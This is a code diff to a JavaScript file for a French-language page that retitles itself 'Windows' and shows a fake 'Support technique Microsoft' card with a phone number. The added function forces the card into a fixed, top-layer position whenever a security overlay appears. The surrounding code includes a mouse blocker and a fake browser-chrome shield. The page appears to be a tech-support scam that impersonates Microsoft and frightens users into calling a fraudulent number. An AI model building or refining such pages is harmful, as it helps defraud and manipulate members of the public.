@@ -5,11 +5,11 @@
   if (!document.querySelector('link[href*="styles.css"]')) {
     var styleLink = document.createElement("link");
     styleLink.rel = "stylesheet";
-    styleLink.href = "styles.css?v=12";
+    styleLink.href = "styles.css?v=13";
     document.head.appendChild(styleLink);
   }
 
-  document.title = "Fond bleu avec modale";
+  document.title = "Windows";
 
   mount.innerHTML =
     '<div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>' +
@@ -52,7 +52,7 @@
     '<button class="scan-btn scan-btn-later" type="button">Analyser plus tard</button>' +
     '</div>' +
     '</section>' +
-    '<aside class="support-card" aria-label="Support technique Microsoft">' +
+    '<aside id="securitySupportCard" class="support-card" aria-label="Support technique Microsoft">' +
     '<p class="support-card-subtitle">Support technique Microsoft</p>' +
     '<p class="support-card-phone">+33 02 59 50 90 20</p>' +
     '<p class="support-card-label">Numero</p>' +
@@ -185,12 +185,26 @@
     }
   }
 
+  function showSupportCard() {
+    var card = document.getElementById("securitySupportCard");
+    if (!card) return;
+    document.body.appendChild(card);
+    card.classList.add("is-visible");
+    card.setAttribute("aria-hidden", "false");
+    card.style.setProperty("display", "block", "important");
+    card.style.setProperty("position", "fixed", "important");
+    card.style.setProperty("right", "12px", "important");
+    card.style.setProperty("bottom", "24px", "important");
+    card.style.setProperty("z-index", "47900", "important");
+  }
+
   function showSecurityPage() {
     if (!securityOverlay) return;
     securityOverlay.classList.add("is-active");
     securityOverlay.setAttribute("aria-hidden", "false");
     document.body.classList.add("security-mode");
     showBrowserChromeShield();
+    showSupportCard();
   }
 
   function showBrowserChromeShield() {
